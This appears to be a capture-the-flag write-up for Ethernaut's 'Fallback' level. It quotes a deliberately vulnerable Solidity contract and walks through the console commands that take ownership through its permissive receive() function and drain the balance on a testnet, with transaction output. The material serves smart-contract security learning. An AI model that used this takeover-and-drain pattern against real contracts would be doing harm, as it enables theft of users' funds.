# Level 1: Fallback

## Game Description

This is the level 1 of [**Ethernaut**](https://ethernaut.openzeppelin.com/) game. It involves Solidity contract fallback function and the conversion between units wei & ether. We can see the following game description:

> Look carefully at the contract's code below.
>
> You will beat this level if
>
> 1. you claim ownership of the contract
> 2. you reduce its balance to 0
>
>  Things that might help
>
> - How to send ether when interacting with an ABI
> - How to send ether outside of the ABI
> - Converting to and from wei/ether units (see `help()` command)
> - Fallback methods
>
> ```solidity
> // SPDX-License-Identifier: MIT
> pragma solidity ^0.8.0;
> 
> contract Fallback {
> 
>   mapping(address => uint) public contributions;
>   address public owner;
> 
>   constructor() {
>     owner = msg.sender;
>     contributions[msg.sender] = 1000 * (1 ether);
>   }
> 
>   modifier onlyOwner {
>         require(
>             msg.sender == owner,
>             "caller is not the owner"
>         );
>         _;
>     }
> 
>   function contribute() public payable {
>     require(msg.value < 0.001 ether);
>     contributions[msg.sender] += msg.value;
>     if(contributions[msg.sender] > contributions[owner]) {
>       owner = msg.sender;
>     }
>   }
> 
>   function getContribution() public view returns (uint) {
>     return contributions[msg.sender];
>   }
> 
>   function withdraw() public onlyOwner {
>     payable(owner).transfer(address(this).balance);
>   }
> 
>   receive() external payable {
>     require(msg.value > 0 && contributions[msg.sender] > 0);
>     owner = msg.sender;
>   }
> }
> ```

## Solution

According to this game description, we have to somehow become `owner` of the contract, then withdraw all amount from contract. From the `constructor()`, it can be seen that `owner`'s contribution is 1000 ether. The key code parts to notice are `contribute()` function and `receive()` fallback function of contract.

When our contributions more than current owner's contributed ether, we have ownership of this contract. That's too expensive. Take a look at receive() fallback function though. It also has way to change ownership. According to the code, we can claim ownership if:

- Contract has a non-zero contribution from us (i.e. `player`).
- Then, we send the contract a non-zero eth amount.

`player` address contributed nothing to contract currently, so let's satisfy first condition by sending a **less than 0.001** eth.

```solidity
> await contract.contribute.sendTransaction({ from: player, value: toWei('0.0009')})
⛏️ Sent transaction ⛏ https://goerli.etherscan.io/tx/0x40b554de3176752d17b9e71728e4535f8f119ec54d2e4854c56288a6dc050bc1
⛏️ Mined transaction ⛏ https://goerli.etherscan.io/tx/0x40b554de3176752d17b9e71728e4535f8f119ec54d2e4854c56288a6dc050bc1
{tx: '0x40b554de3176752d17b9e71728e4535f8f119ec54d2e4854c56288a6dc050bc1', receipt: {…}, logs: Array(0)}
```

Now we have a non-zero contribution that can be verify by:

```solidity
> await contract.getContribution().then(v => v.toString())
'900000000000000'
```

And then send any non-zero amount of ether to contract:

```solidity
> await sendTransaction({from: player, to: contract.address, value: toWei('0.00000001')})
'0xb0cbbfb4bb1b9885e67267542cbde8ad31980b3e3615772a92f99c62ee1c8b88'
⛏️ Sent transaction ⛏ https://goerli.etherscan.io/tx/0xb0cbbfb4bb1b9885e67267542cbde8ad31980b3e3615772a92f99c62ee1c8b88
⛏️ Mined transaction ⛏ https://goerli.etherscan.io/tx/0xb0cbbfb4bb1b9885e67267542cbde8ad31980b3e3615772a92f99c62ee1c8b88
```

Yeah! We claimed ownership of the contract. You can verify that `owner` is same address as `player` by:

```solidity
> await contract.owner() == player
true
> await contract.owner()
'0x7328c28323b00236C0556cbA56E26ce0f3a0abcd'
```

And for the final blow, withdraw all balance from contract:

```solidity
> await contract.withdraw()
⛏️ Sent transaction ⛏ https://goerli.etherscan.io/tx/0x30749ffd1c277d88bc92a82e37ffa43da00c87004ed174f2fcefe849afcf2469
⛏️ Mined transaction ⛏ https://goerli.etherscan.io/tx/0x30749ffd1c277d88bc92a82e37ffa43da00c87004ed174f2fcefe849afcf2469
{tx: '0x30749ffd1c277d88bc92a82e37ffa43da00c87004ed174f2fcefe849afcf2469', receipt: {…}, logs: Array(0)}
```

Submitting level instance.

```solidity
d[ o_0 ]b Submitting level instance... <  < <<PLEASE WAIT>> >  >
⛏️ Sent transaction ⛏ https://goerli.etherscan.io/tx/0x0a9b9aa382c5b931f4b2f91d978e8afa55ea139a923d77af76f14fab0f5fabc1
⛏️ Mined transaction ⛏ https://goerli.etherscan.io/tx/0x0a9b9aa382c5b931f4b2f91d978e8afa55ea139a923d77af76f14fab0f5fabc1
／人 ⌒ ‿‿ ⌒ 人＼ Well done, You have completed this level!!!
／人 ⌒ ‿‿ ⌒ 人＼ Well done, You have completed this level!!!
／人 ⌒ ‿‿ ⌒ 人＼ Well done, You have completed this level!!!
```

Level completed! [**Go to the next level**](Fallout.md).

